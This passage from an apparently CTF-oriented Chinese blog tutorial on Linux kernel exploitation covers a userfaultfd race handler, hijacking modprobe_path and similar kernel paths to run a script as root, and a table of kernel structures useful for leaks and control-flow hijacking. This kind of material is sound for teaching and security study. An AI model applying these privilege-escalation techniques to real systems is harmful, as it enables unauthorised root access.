<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">registerUserFaultFd(addr, len, handler);</span><br></pre></td></tr></table></figure></div>

<p>需要注意的是 handler 的写法，这里直接照抄 Linux man page 改了改，可以根据个人需求进行个性化改动：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>; <span class="comment">// 你要拷贝进去的数据</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * [在这停顿.jpg]</span></span><br><span class="line"><span class="comment">         * 当 poll 返回时说明出现了缺页异常</span></span><br><span class="line"><span class="comment">         * 你可以在这里插入一些比如说 sleep() 一类的操作</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="setxattr-userfaultfd"><a href="#setxattr-userfaultfd" class="headerlink" title="setxattr + userfaultfd"></a>setxattr + userfaultfd</h2><h2 id="FUSE-race"><a href="#FUSE-race" class="headerlink" title="FUSE race"></a>FUSE race</h2><h2 id="punch-hole"><a href="#punch-hole" class="headerlink" title="punch hole"></a>punch hole</h2><h3 id="利用思路-31"><a href="#利用思路-31" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-29"><a href="#exp-29" class="headerlink" title="exp"></a>exp</h3><h1 id="Kernel-Trick"><a href="#Kernel-Trick" class="headerlink" title="Kernel Trick"></a>Kernel Trick</h1><h2 id="修改符号链接"><a href="#修改符号链接" class="headerlink" title="修改符号链接"></a>修改符号链接</h2><blockquote>
<p>与modprobe_path类似，还有core_pattern，</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定位，默认 core_pattern = core</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">validate_coredump_safety</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COREDUMP</span></span><br><span class="line">	<span class="keyword">if</span> (suid_dumpable == SUID_DUMP_ROOT &amp;&amp;</span><br><span class="line">	    core_pattern[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span> &amp;&amp; core_pattern[<span class="number">0</span>] != <span class="string">&#x27;|&#x27;</span>) &#123;</span><br><span class="line">		printk(KERN_WARNING</span><br><span class="line"><span class="string">&quot;Unsafe core_pattern used with fs.suid_dumpable=2.\n&quot;</span></span><br><span class="line"><span class="string">&quot;Pipe handler or fully qualified core dump path required.\n&quot;</span></span><br><span class="line"><span class="string">&quot;Set kernel.core_pattern before fs.suid_dumpable.\n&quot;</span></span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>poweroff_cmd，</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定位，默认 poweroff_cmd = /sbin/poweroff</span></span><br><span class="line">__int64 <span class="title function_">poweroff_work_func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0; <span class="comment">// bl</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v0 = poweroff_force;</span><br><span class="line">  result = run_cmd(poweroff_cmd);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_FFFFFFFF81CB2888);</span><br><span class="line">      emergency_sync();</span><br><span class="line">      <span class="keyword">return</span> kernel_power_off();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>uevent_helper，</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定位，默认不进行初始化。</span></span><br><span class="line">__int64 <span class="title function_">uevent_helper_store</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(v1 + <span class="number">1</span>) &gt; <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-2LL</span>;</span><br><span class="line">  v2 = v1;</span><br><span class="line">  v3 = <span class="built_in">memcpy</span>(uevent_helper, v0, v1);</span><br><span class="line">  uevent_helper[v2] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 || *(_BYTE *)(v3 + v2 - <span class="number">1</span>) != <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">  *(_BYTE *)(v3 + v2 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>等也可以被修改。</p>
<p>当<code>CONFIG_STATIC_USERMODEHELPER_PATH=&quot;y&quot;</code>被设置后，无法使用这些方法。</p>
</blockquote>
<p>当能够任意地址分配的时候，与 glibc 改 hook 类似，在内核中通常修改的是 <code>modprobe_path</code> 。<code>modprobe_path</code> 是内核中的一个变量，其值为 <code>/sbin/modprobe</code> ，因此对于缺少符号的内核文件可以通过搜索 <code>/sbin/modprobe</code> 字符串的方式定位这个变量。</p>
<p>当我们尝试去执行（execve）一个非法的文件（file magic not found），内核会经历如下调用链：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">    sys_execve()</span><br><span class="line">        do_execve()</span><br><span class="line">            do_execveat_common()</span><br><span class="line">                bprm_execve()</span><br><span class="line">                    exec_binprm()</span><br><span class="line">                        search_binary_handler()</span><br><span class="line">                            __request_module() <span class="comment">// wrapped as request_module</span></span><br><span class="line">                                call_modprobe()</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>call_modprobe()</code> 定义于 <code>kernel/kmod.c</code>，我们主要关注这部分代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">	argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">					 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line">	<span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>

<p>在这里调用了函数 <code>call_usermodehelper_exec()</code> 将 <code>modprobe_path</code> 作为可执行文件路径以 root 权限将其执行。<br>我们不难想到的是：若是我们能够劫持 <code>modprobe_path</code>，将其改写为我们指定的恶意脚本的路径，随后我们再执行一个非法文件，内核将会以 root 权限执行我们的恶意脚本。</p>
<p>或者分析<code>vmlinux</code>即可(对于一些没有<code>call_modprobe()</code>符号的直接交叉引用即可)。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 _request_module(</span><br><span class="line">        <span class="type">char</span> a1,</span><br><span class="line">        __int64 a2,</span><br><span class="line">        <span class="type">double</span> a3,</span><br><span class="line">        <span class="type">double</span> a4,</span><br><span class="line">        <span class="type">double</span> a5,</span><br><span class="line">        <span class="type">double</span> a6,</span><br><span class="line">        <span class="type">double</span> a7,</span><br><span class="line">        <span class="type">double</span> a8,</span><br><span class="line">        <span class="type">double</span> a9,</span><br><span class="line">        <span class="type">double</span> a10,</span><br><span class="line">        ...)</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">if</span> ( v19 )</span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">      v21 = call_usermodehelper_setup(</span><br><span class="line">              (__int64)&amp;byte_FFFFFFFF82444700, <span class="comment">// modprobe_path</span></span><br><span class="line">              (__int64)v18,</span><br><span class="line">              (__int64)&amp;off_FFFFFFFF82444620,</span><br><span class="line">              <span class="number">3264</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              (__int64)free_modprobe_argv,</span><br><span class="line">              <span class="number">0LL</span>);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line">.data:FFFFFFFF82444700 byte_FFFFFFFF82444700             ; DATA XREF: __request_module:loc_FFFFFFFF8108C6D8↑r</span><br><span class="line">.data:FFFFFFFF82444700                 db <span class="number">2F</span>h  ; /       ; __request_module+<span class="number">14B</span>↑o ...                       </span><br><span class="line">.data:FFFFFFFF82444701                 db  <span class="number">73</span>h ; s</span><br><span class="line">.data:FFFFFFFF82444702                 db  <span class="number">62</span>h ; b</span><br><span class="line">.data:FFFFFFFF82444703                 db  <span class="number">69</span>h ; i</span><br><span class="line">.data:FFFFFFFF82444704                 db  <span class="number">6</span>Eh ; n</span><br><span class="line">.data:FFFFFFFF82444705                 db  <span class="number">2F</span>h ; /</span><br><span class="line">.data:FFFFFFFF82444706                 db  <span class="number">6</span>Dh ; m</span><br><span class="line">.data:FFFFFFFF82444707                 db  <span class="number">6F</span>h ; o</span><br><span class="line">.data:FFFFFFFF82444708                 db  <span class="number">64</span>h ; d</span><br><span class="line">.data:FFFFFFFF82444709                 db  <span class="number">70</span>h ; p</span><br><span class="line">.data:FFFFFFFF8244470A                 db  <span class="number">72</span>h ; r</span><br><span class="line">.data:FFFFFFFF8244470B                 db  <span class="number">6F</span>h ; o</span><br><span class="line">.data:FFFFFFFF8244470C                 db  <span class="number">62</span>h ; b</span><br><span class="line">.data:FFFFFFFF8244470D                 db  <span class="number">65</span>h ; e</span><br><span class="line">.data:FFFFFFFF8244470E                 db    <span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<h2 id="从内存搜索-flag"><a href="#从内存搜索-flag" class="headerlink" title="从内存搜索 flag"></a>从内存搜索 flag</h2><h2 id="从-sys-kernel-notes-泄露内核地址"><a href="#从-sys-kernel-notes-泄露内核地址" class="headerlink" title="从 &#x2F;sys&#x2F;kernel&#x2F;notes 泄露内核地址"></a>从 &#x2F;sys&#x2F;kernel&#x2F;notes 泄露内核地址</h2><h1 id="常见结构体的利用"><a href="#常见结构体的利用" class="headerlink" title="常见结构体的利用"></a>常见结构体的利用</h1><table>
<thead>
<tr>
<th>结构体&#x2F;能力</th>
<th>控制流劫持</th>
<th>泄露堆</th>
<th>泄露栈</th>
<th>泄露内核地址</th>
<th>结构体大小</th>
</tr>
</thead>
<tbody><tr>
<td>cred</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>0xa8 (kmalloc-192)</td>
</tr>
<tr>
<td>tty_struct</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>0x2e0 (kmalloc-1024)</td>
</tr>
<tr>
<td>seq_operations</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>0x20 (kmalloc-32)</td>
</tr>
<tr>
<td>subprocess_info</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>0x60 (kmalloc-128)</td>
</tr>
<tr>
<td>pipe_buffer</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>0x280 (kmalloc-1024)</td>
</tr>
<tr>
<td>shm_file_data</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>0x20 (kmalloc-32)</td>
</tr>
<tr>
<td>msg_msg</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>x</td>
<td>0x31~0x1000 (&gt;&#x3D; kmalloc-64)</td>
</tr>
<tr>
<td>timerfd_ctx</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>0xf0 (kmalloc-256)</td>
</tr>
</tbody></table>
<h2 id="system-V-消息队列"><a href="#system-V-消息队列" class="headerlink" title="system V 消息队列"></a>system V 消息队列</h2><h2 id="pipe-管道相关"><a href="#pipe-管道相关" class="headerlink" title="pipe 管道相关"></a>pipe 管道相关</h2><h2 id="io-uring-与异步-IO-相关"><a href="#io-uring-与异步-IO-相关" class="headerlink" title="io_uring 与异步 IO 相关"></a>io_uring 与异步 IO 相关</h2>
		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> 深入理解Pwn_Kernel及相关例题</li>
        <li><strong>Author:</strong> 韩乔落</li>
        <li><strong>Created at
                :</strong> 2023-10-16 20:15:29</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-06-04 16:57:03
            </li>
        
        <li>
            <strong>Link:</strong> https://jelasin.github.io/2023/10/16/深入理解Pwn_Kernel及相关例题/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/Pwn-Kernel/">#Pwn_Kernel</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2023/10/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%A6/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">计算机科学中的数学-python实现</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Other%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">深入理解Pwn_Other及相关例题</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'jelasin/jelasin.github.io',
                'data-repo-id': 'R_kgDOKVydDA',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDOKVydDM4CZe2W',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'not-lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">深入理解Pwn_Kernel及相关例题</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E7%AE%80%E4%BB%8B"><span class="nav-text">内核简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ring-Model"><span class="nav-text">Ring Model</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Loadable-Kernel-Modules-LKMs"><span class="nav-text">Loadable Kernel Modules(LKMs)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-text">概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4"><span class="nav-text">相关指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E6%80%81-%E5%86%85%E6%A0%B8%E6%80%81"><span class="nav-text">用户态-&gt;内核态</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%80%81-%E7%94%A8%E6%88%B7%E6%80%81"><span class="nav-text">内核态-&gt;用户态</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%80%81%E5%87%BD%E6%95%B0"><span class="nav-text">内核态函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E4%BF%9D%E6%8A%A4"><span class="nav-text">内核保护</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E9%97%B4%E7%9B%B8%E5%85%B3"><span class="nav-text">空间相关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3"><span class="nav-text">地址相关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E7%9B%B8%E5%85%B3"><span class="nav-text">信息相关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%9B%B8%E5%85%B3"><span class="nav-text">数据相关</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-%E5%86%85%E6%A0%B8%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86"><span class="nav-text">Linux 内核内存管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98"><span class="nav-text">物理内存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%9E%B6%E6%9E%84"><span class="nav-text">内存架构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B"><span class="nav-text">内存模型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A0%88"><span class="nav-text">内核栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E5%A0%86"><span class="nav-text">内核堆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%91%E6%A0%B8"><span class="nav-text">绑核</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="nav-text">进程权限管理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">权限保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AE%B5%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">段保护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A1%B5%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">页保护机制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8Bcred%E6%8C%87%E9%92%88%E5%AE%9A%E4%BD%8D"><span class="nav-text">进程cred指针定位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#commit-creds-prepare-kernel-cred-0"><span class="nav-text">commit_creds(prepare_kernel_cred(0))</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#commit-creds-init-cred"><span class="nav-text">commit_creds(&amp;init_cred)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5"><span class="nav-text">符号链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-usermodehelper"><span class="nav-text">call_usermodehelper</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 